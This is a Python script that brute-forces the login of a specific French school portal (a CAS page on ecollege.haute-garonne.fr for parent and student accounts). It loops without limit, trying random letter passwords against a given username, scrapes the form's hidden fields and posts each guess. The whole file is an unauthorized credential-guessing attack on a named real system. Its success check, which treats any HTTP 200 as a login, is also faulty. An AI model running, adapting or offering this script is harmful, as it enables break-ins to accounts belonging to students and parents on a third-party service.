import argparse
import requests
import random
import string
import time
from bs4 import BeautifulSoup

def generate_random_letters(limit):
    letters = string.ascii_letters
    random_letters = random.choices(letters, k=limit)
    return ''.join(random_letters)

# Create an argument parser
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--username', help='Username for login')
parser.add_argument('-l', '--limit', type=int, help='Maximum character limit')
args = parser.parse_args()

# Check if the username argument is provided
if args.username:
    username = args.username
else:
    username = input("Enter the username: ")

# Check if the limit argument is provided
if args.limit:
    limit = args.limit
else:
    limit = int(input("Enter the maximum character limit: "))

# Ent Login Page URL (to be completed with the login page)
url = 'https://cas.ecollege.haute-garonne.fr/login?selection=ATS_parent_eleve&service=https%3A%2F%2Fleon-blum.ecollege.haute-garonne.fr%2Fsg.do%3FPROC%3DIDENTIFICATION_FRONT&submit=Valider'

# Create a session
session = requests.Session()

while True:
    # Generate a random number of characters within the limit to test all possibilities
    random_limit = random.randint(1, limit)
    password = generate_random_letters(random_limit)

    # Get the login form from the URL
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')

    # Extract the necessary fields and values for logging into the account
    payload = {}
    for input_field in form.find_all('input'):
        name = input_field.get('name')
        value = input_field.get('value')
        if name and value:
            payload[name] = value

    # Add the login credentials
    payload['username'] = username
    payload['password'] = password

    # Send the login request
    response = session.post(url, data=payload)

    # Check if the login was successful
    if response.status_code == 200:
        print('Connexion réussie avec le mot de passe :', password)
        break
    else:
        print('Échec de la connexion avec le mot de passe :', password)

# Close the session
session.close()
